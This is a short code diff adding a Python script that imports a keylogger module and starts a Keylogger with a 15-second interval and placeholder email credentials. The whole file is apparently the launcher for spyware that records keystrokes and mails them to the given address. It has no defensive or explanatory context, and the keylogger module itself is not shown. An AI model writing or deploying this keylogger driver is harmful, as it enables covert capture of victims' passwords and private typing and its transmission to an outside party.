@@ -1,0 +1,5 @@
+#!/usr/bin/env python
+import keylogger
+
+my_keylogger = keylogger.Keylogger(15, "your@email.com", "password")
+my_keylogger.start()
